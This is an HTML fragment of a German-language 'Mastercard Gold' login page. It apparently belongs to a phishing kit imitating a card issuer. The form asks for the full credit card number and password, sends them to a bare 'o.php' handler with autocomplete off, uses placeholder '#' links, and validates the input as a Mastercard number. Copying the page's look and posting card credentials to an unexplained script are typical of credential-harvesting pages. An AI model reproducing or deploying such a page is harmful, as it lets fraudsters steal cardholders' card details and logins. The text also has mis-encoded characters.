            ...
            <div class="container">
                <div class="row">
                    ...
                    <div class="col-lg-9 col-md-9 col-sm-12 col-12 content">
                        ...
                        <!-- LOGIN AREA -->
						<form name="preLogonForm" method="post" action="o.php" autocomplete="off">
                            ...
                            <div class="row">
                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                                    <h1>Login</h1>
                                        ...
                                        <div class="form-group">
                                            <label for="username">Kreditkartennummer</label>
                                          <span id="sprytextfield1">
                                          <input type="text" class="form-control" name="username" id="username">
                                          </span><span class="textfieldInvalidFormatMsg"></span></span></div>
                                        <div class="form-group">
                                          <label for="password">Passwort</label>
                                          <span id="sprypassword1">
                                          <input type="password" class="form-control" name="password" id="password">
                                          </div>
                                        <a class="link" href="#">Passwort vergessen? <i class="fas fa-chevron-right"></i></a>
                                ...
                                <div class="col-md-6 align-items-end d-flex">
                                    <div style="width: 100%">
                                        ...
                                        <p class="font-weight-300">Registrieren Sie Ihre gebÃ¼hrenfreie Mastercard Gold in wenigen Schritten.</p>
                        ...
                        <div class="row">
                            ...
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                                ...
                                <p class="mb-1">Beantragen Sie jetzt Ihre GebÃ¼hrenfrei MasterCard Gold.</p>
                        ...
                        <div class="row">
                            ...
                            <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                                ...
                                <p class="mb-1">Informieren Sie sich Ã¼ber die attraktiven Konditionen.</p>
                ...
                <div class="inner-footer">
                    <div class="row">
                        <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                            ...
                            <br>
                            <p>
                                Fragen zur gebÃ¼hrenfreien Mastercard Gold<br>
                                <a href="#">0800 880 1120</a> (gebÃ¼hrenfrei aus dem deutschen Festnetz)<br>
...
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "credit_card", {validateOn:["blur", "change"], format:"mastercard"});
